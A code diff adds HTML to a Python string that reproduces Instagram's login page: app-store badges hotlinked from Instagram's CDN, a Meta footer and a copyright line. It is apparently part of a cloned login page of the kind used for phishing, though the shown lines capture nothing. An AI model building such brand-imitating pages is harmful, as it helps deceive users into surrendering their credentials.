@@ -215,6 +215,38 @@ html_code = """
         <p>Don't have an account? <a class="signup" href="#">Sign Up</a></p>
     </div>
 </div>
+<div class="get">
+         Get the app.
+      </div>
+      <br>
+      <div class="apps">
+         <a href="/forget.html">
+         <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" height="40"
+            width="134"></a>&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;&NonBreakingSpace;<a href="/forget.html"> 
+         <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" height="40" width="134"></a>
+      </div>
+      <br>
+      <div class="footer">
+         <footer>
+            Meta
+            About
+            Blog
+            Jobs
+            Help
+            API
+            Privacy
+            Terms
+            Top Accounts
+            Hashtags
+            Locations
+            Instagram Lite
+            Contact Uploading & Non-Users
+         </footer>
+      </div>
+      <div class="copyright">
+         <br>    
+         English © 2022 Instagram from Meta
+      </div>
 
 </body>
 </html>
